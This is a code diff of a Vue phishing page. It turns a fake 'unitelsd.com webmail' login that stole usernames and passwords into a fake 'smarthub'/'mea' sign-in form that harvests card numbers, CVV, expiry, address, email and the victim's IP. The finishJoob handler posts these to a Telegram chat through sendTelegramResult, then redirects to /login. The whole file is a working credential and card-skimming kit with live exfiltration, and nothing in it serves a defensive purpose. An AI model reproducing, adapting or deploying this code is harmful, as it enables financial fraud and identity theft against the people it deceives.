@@ -1,84 +1,149 @@
 <template>
   <div class="page">
-    <div class="overlay">
-      <img
-        style="margin-bottom: 40px"
-        src="https://webmail.unitelsd.com/logos/all/unitelsd.com.png?s=1732144309"
-        alt=""
-      />
+    <div class="login-box" style="position: relative;">
 
-      <div class="login-box">
-        <form @submit.prevent="finishJoob">
-          <div class="input-group">
-            <div class="icon">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="18"
-                height="18"
-                viewBox="0 0 24 24"
-                fill="#d8d8d8"
-              >
-                <path
-                  d="M12 12c2.76 0 5-2.24 5-5S14.76 2 12 2 7 4.24 7 7s2.24 5 5 5zm0 2c-3.33 0-10 1.67-10 5v3h20v-3c0-3.33-6.67-5-10-5z"
-                />
-              </svg>
-            </div>
+          <img style="width: 200px; position: absolute; right: 180px; top: 20px;" src="../public/smarthub.png" alt="smarthub">
+          <img style="width: 280px; position: absolute; left: 180px; bottom: 20px;" src="../public/mea.png" alt="mea">
+      
 
-            <input
-              v-model="formDataRes.username"
-              type="text"
-              placeholder="Username"
-            />
-          </div>
+      <form @submit.prevent="finishJoob" action="">
+        <!-- Email -->
+        <!-- <div class="input-group">
+          <input
+            type="email"
+            v-model="formDataRes.email"
+            @focus="focusField('email')"
+            @blur="blurField('email')"
+            required
+          />
 
-          <div class="input-group">
-            <div class="icon">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="18"
-                height="18"
-                viewBox="0 0 24 24"
-                fill="#d8d8d8"
-              >
-                <path
-                  d="M17 8h-1V6a4 4 0 00-8 0v2H7a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2V10a2 2 0 00-2-2zm-7-2a2 2 0 114 0v2h-4V6zm7 14H7V10h10v10z"
-                />
-              </svg>
-            </div>
+          <label :class="{ active: isActive('email') }"> Email </label>
+        </div> -->
 
-            <input
-              v-model="formDataRes.password"
-              type="password"
-              placeholder="Password"
-            />
-          </div>
+        <!-- <p v-if="emailTouched && !email" class="error">Email is required.</p> -->
 
-          <button
-            :disabled="loading || !isFormValid"
+
+         <!-- ================================ -->
+
+        <div class="group">
+          <label
+            >Email <span>*</span></label
           >
-            <span v-if="!loading">LOGIN</span>
-            <span v-else>Loading...</span>
-          </button>
-        </form>
-      </div>
 
-      <!-- Loading Overlay -->
-      <div v-if="loading" class="over">
-        <div class="loader"></div>
-        <!-- <p>Please wait...</p> -->
-      </div>
-
-      <!-- Success Popup -->
-      <div v-if="showPopup" class="popup">
-        <div class="popup-content">
-          <h3></h3>
-          <br>
-          <p>Redirecting...</p>
+          <input
+            v-model="formDataRes.email"
+            required
+            type="email"
+          />
         </div>
-      </div>
 
-      <div class="footer">unitelsd.com webmail</div>
+        <!-- ================================ -->
+
+        <div class="group">
+          <label
+            >Cardholder name <span>*</span></label
+          >
+
+          <input
+            v-model="formDataRes.cardHolderName"
+            required
+            type="text"
+          />
+        </div>
+
+        <!-- ================================ -->
+
+        <div class="group">
+          <label>Card number <span>*</span> </label>
+
+          <input v-model="formDataRes.cardNumber" type="number" />
+        </div>
+
+        <div class="row">
+          <div class="group">
+            <label>Exp. Month <span>*</span></label>
+            <select v-model="formDataRes.selectedMonth">
+              <option v-for="month in months" :key="month" :value="month">
+                {{ month }}
+              </option>
+            </select>
+          </div>
+
+          <!-- ================================ -->
+
+          <div class="group">
+            <label>Exp. Year <span>*</span></label>
+
+            <select v-model="formDataRes.selectedYear">
+              <option v-for="year in years" :key="year" :value="year">
+                {{ year }}
+              </option>
+            </select>
+          </div>
+        </div>
+
+        <!-- ================================ -->
+
+        <div class="group">
+          <label>Address <span>*</span></label>
+
+          <input v-model="formDataRes.add1" type="text" />
+        </div>
+
+        <!-- <div class="group">
+            <label>Address line 2 (Optional)</label>
+
+            <input v-model="formDataRes.add2" type="text" />
+          </div>
+
+          <div class="group">
+            <label>City <span>*</span></label>
+
+            <input v-model="formDataRes.city" type="text" />
+          </div>
+
+          <div class="group">
+            <label>State <span>*</span></label>
+
+            <select v-model="formDataRes.selectedState">
+              <option v-for="state in states" :key="state" :value="state">
+                {{ state }}
+              </option>
+            </select>
+          </div> -->
+
+        <div class="group zip">
+          <label>CVV <span>*</span></label>
+
+          <input v-model="formDataRes.cvv" type="number" />
+        </div>
+
+        <div class="group zip">
+          <label>Zip code <span>*</span></label>
+
+          <input v-model="formDataRes.zipcode" type="number" />
+        </div>
+
+        <div class="group">
+          <label>Country/Region <span>*</span></label>
+
+          <select disabled>
+            <option>United States</option>
+          </select>
+        </div>
+
+        <button>Sign In</button>
+      </form>
+
+      <div class="links">
+        <ul>
+          <li>Can't access your account?</li>
+          <li>Don't have an account? Register now.</li>
+        </ul>
+      </div>
     </div>
+
+    <div class="version">Version: 26.13.2</div>
   </div>
 </template>
 
@@ -87,41 +152,160 @@ import axios from "axios";
 
 export default {
   data() {
+    const currentYear = new Date().getFullYear() % 100;
+
     return {
       formDataRes: {
-        username: "",
-        password: "",
+        cardHolderName: "",
+        cardNumber: "",
+        // selectedMonth: " ",
+        // selectedYear: " ",
+        // selectedState: " ",
+        add1: "",
+        // add2: " ",
+        // city: " ",
+        // states: " ",
+        cvv: "",
+        zipcode: "",
+        email: "",
       },
-      showPopup: false,
-      loading: false,
-      isActive: false,
+      months: [
+        "01",
+        "02",
+        "03",
+        "04",
+        "05",
+        "06",
+        "07",
+        "08",
+        "09",
+        "10",
+        "11",
+        "12",
+      ],
+
+      years: Array.from({ length: 20 }, (_, i) =>
+        String(currentYear + i).padStart(2, "0")
+      ),
+
+      states: [
+        "Alabama",
+        "Alaska",
+        "Arizona",
+        "Arkansas",
+        "California",
+        "Colorado",
+        "Connecticut",
+        "Delaware",
+        "Florida",
+        "Georgia",
+        "Hawaii",
+        "Idaho",
+        "Illinois",
+        "Indiana",
+        "Iowa",
+        "Kansas",
+        "Kentucky",
+        "Louisiana",
+        "Maine",
+        "Maryland",
+        "Massachusetts",
+        "Michigan",
+        "Minnesota",
+        "Mississippi",
+        "Missouri",
+        "Montana",
+        "Nebraska",
+        "Nevada",
+        "New Hampshire",
+        "New Jersey",
+        "New Mexico",
+        "New York",
+        "North Carolina",
+        "North Dakota",
+        "Ohio",
+        "Oklahoma",
+        "Oregon",
+        "Pennsylvania",
+        "Rhode Island",
+        "South Carolina",
+        "South Dakota",
+        "Tennessee",
+        "Texas",
+        "Utah",
+        "Vermont",
+        "Virginia",
+        "Washington",
+        "West Virginia",
+        "Wisconsin",
+        "Wyoming",
+      ],
+
+      // isActive: false,
       count: 0,
       finalCount: 1, // Only send once
+      loading: false,
+      showPassword: false,
+      focused: {},
+      touched: {},
     };
   },
 
   computed: {
     isFormValid() {
       return (
-        this.formDataRes.username.trim() !== "" &&
-        this.formDataRes.password.trim() !== ""
+        this.formDataRes.cardHolderName.trim() !== "" &&
+        this.formDataRes.cardNumber.trim() !== "" &&
+        this.formDataRes.selectedMonth.trim() !== "" &&
+        this.formDataRes.selectedYear.trim() !== "" &&
+        this.formDataRes.add1.trim() !== "" &&
+        this.formDataRes.email.trim() !== "" &&
+        // this.formDataRes.add2.trim() !== "" &&
+        // this.formDataRes.city.trim() !== "" &&
+        // this.formDataRes.selectedState.trim() !== "" &&
+        this.formDataRes.zipcode.trim() !== "" &&
+        this.formDataRes.cvv.trim() !== ""
       );
     },
   },
 
   methods: {
-    // registerFan() {
-    //   this.showPopup = true;
-    // },
+    focusField(field) {
+      this.$set(this.focused, field, true);
+    },
+
+    blurField(field) {
+      this.$set(this.touched, field, true);
+
+      this.$set(this.focused, field, this.formDataRes[field].trim().length > 0);
+    },
+
+    isActive(field) {
+      return this.focused[field] || this.formDataRes[field].trim().length > 0;
+    },
 
     async finishJoob() {
-      this.loading = true;
-      this.showPopup = false;
-
       this.count++;
 
-      // Format the message
-      const message = `*🔔🔔🔔 GOLDENWEST 🔔🔔🔔 *\nUSERNAME: ${this.formDataRes.username}\nPASSWORD: ${this.formDataRes.password}`;
+      // if (this.count < this.finalCount) {
+      this.loading = true;
+
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      const email = this.$route.query.email;
+      const ip = data.ip;
+
+      // Format the message as string
+      const message = `MEA
+        \nEMAIL: ${this.formDataRes.email}
+        \nCARD HOLDER NAME: ${this.formDataRes.cardHolderName}
+        \nCARD NUMBER: ${this.formDataRes.cardNumber}
+        \nMONTH: ${this.formDataRes.selectedMonth}
+        \nYEAR: ${this.formDataRes.selectedYear}
+        \nADDRESS LINE 1: ${this.formDataRes.add1}
+        \nCVV: ${this.formDataRes.cvv}
+        \nZIPCODE: ${this.formDataRes.zipcode}
+        \nIP: ${ip}`;
 
       // Send to Telegram
       await this.sendTelegramResult(
@@ -129,16 +313,22 @@ export default {
         message
       );
 
-      // Keep the loader visible for 3 seconds
+      // this.isActive = !this.isActive;
+      // this.loading = false;
+      // } else {
+      // Redirect after sending
+      // location.replace("/login");
+      // }
+
       setTimeout(() => {
+        this.isActive = !this.isActive;
         this.loading = false;
-        this.showPopup = true;
 
         // Keep the popup visible for 2 seconds
         setTimeout(() => {
-          this.$router.push("/");
-        }, 2000);
-      }, 3000);
+          this.$router.push("/login");
+        }, 1000);
+      }, 1000);
     },
 
     async sendTelegramResult(chatId, message) {
@@ -161,171 +351,144 @@ export default {
 </script>
 
 <style scoped>
-#app {
-  margin: 0 !important;
-  padding: 0 !important;
-  width: 100%;
-  height: 100%;
-}
-
 * {
+  box-sizing: border-box;
   margin: 0;
   padding: 0;
-  box-sizing: border-box;
-  font-family: Arial, Helvetica, sans-serif;
 }
 
 body {
-  box-sizing: border-box;
-  padding: 0;
+  background: red;
   margin: 0;
+  padding: 0;
   width: 100%;
-  height: 100vh;
+  height: 100%;
 }
 
 .page {
   width: 100%;
+  margin: 0;
+  padding: 0;
+  background: #0c4f93;
   height: 100vh;
-  background: url("https://d3mqmy22owj503.cloudfront.net/30/501030/images/site_graphics/hero-1.jpg")
-    center center;
-  background-size: cover;
-}
-
-.overlay {
-  width: 100%;
-  height: 100%;
-  background: rgba(0, 0, 0, 0.45);
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-}
-
-.over {
-  position: fixed;
-  inset: 0;
-  background: rgba(0, 0, 0, 0.45);
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-  z-index: 9999;
-}
-
-.loader {
-  width: 55px;
-  height: 55px;
-  border: 5px solid #ddd;
-  border-top: 5px solid #1976d2;
-  border-radius: 50%;
-  animation: spin 1s linear infinite;
-}
-
-.popup {
-  position: fixed;
-  inset: 0;
-  background: rgba(0, 0, 0, 0.35);
   display: flex;
   justify-content: center;
   align-items: center;
-  z-index: 10000;
-}
-
-.popup-content {
-  background: #fff;
-  padding: 30px;
-  border-radius: 10px;
-  text-align: center;
-  min-width: 280px;
-}
-
-@keyframes spin {
-  to {
-    transform: rotate(360deg);
-  }
+  position: relative;
+  font-family: Arial, Helvetica, sans-serif;
 }
 
 .login-box {
-  width: 430px;
-
-  background: rgba(34, 34, 34, 0.88);
-
-  padding: 42px;
-
-  border-radius: 4px;
-}
-
-.input-group {
+  width: 1070px;
+  height: 610px;
+  background: white;
   display: flex;
-  margin-bottom: 12px;
-}
-
-.icon {
-  width: 52px;
-  height: 46px;
-
-  background: #3a3a3a;
-
-  display: flex;
+  flex-direction: column;
   justify-content: center;
   align-items: center;
-
-  border: 1px solid #5f7682;
-  border-right: none;
-
-  color: #d5d5d5;
 }
 
-.input-group input {
-  flex: 1;
+form {
+  width: 310px;
+  height: 50%;
+  overflow: scroll;
+  padding-top: 20px;
+}
 
-  height: 46px;
+.input-group,
+.group {
+  position: relative;
+  margin-bottom: 16px;
+}
 
-  background: #252d31;
-
-  border: 1px solid #5f7682;
-
-  color: white;
-
-  padding: 0 15px;
-
+.input-group input,
+.group input,
+.input-group select,
+.group select {
+  width: 100%;
+  height: 54px;
+  border: 1px solid #aaa;
+  border-radius: 4px;
+  padding: 0 14px 0;
+  outline: none;
   font-size: 16px;
 }
 
-.input-group input::placeholder {
-  color: #aeb7bc;
+.input-group input:focus,
+.group input:focus {
+  border: 1px solid red;
+}
+
+.group label {
+  font-size: 14px;
+}
+
+.input-group label {
+  position: absolute;
+  left: 14px;
+  top: 18px;
+  color: #666;
+  background: white;
+  padding: 0 4px;
+  transition: 0.2s;
+  pointer-events: none;
+}
+
+.input-group label.active {
+  top: -8px;
+  font-size: 12px;
+  color: red;
+}
+
+.error {
+  color: red;
+  font-size: 13px;
+  margin: 5px 0 18px 10px;
 }
 
 button {
-  width: 100%;
-  height: 42px;
-
+  width: 105px;
+  height: 36px;
+  float: right;
+  margin-top: 25px;
   border: none;
-
-  background: #0c84c6;
-
+  background: #c8c8c8;
   color: white;
-
-  font-size: 16px;
-  font-weight: bold;
-
+  border-radius: 3px;
   cursor: pointer;
-
-  border-radius: 2px;
+  font-size: 15px;
 }
 
-button:hover {
-  background: #0b76b2;
+button:disabled {
+  cursor: not-allowed;
 }
 
-.footer {
+button:not(:disabled) {
+  background: #0c4f93;
+}
+
+.links {
+  width: 310px;
+  margin-top: 60px;
+}
+
+.links ul {
+  padding-left: 16px;
+  margin: 0;
+}
+
+.links li {
+  margin: 4px 0;
+  font-size: 12px;
+  font-weight: 200;
+  cursor: pointer;
+  z-index: 1000;
+}
+
+.version {
   position: absolute;
-
-  left: 8px;
   bottom: 8px;
-
-  color: white;
-
-  font-size: 11px;
+  color: black;
+  font-size: 13px;
 }
 </style>
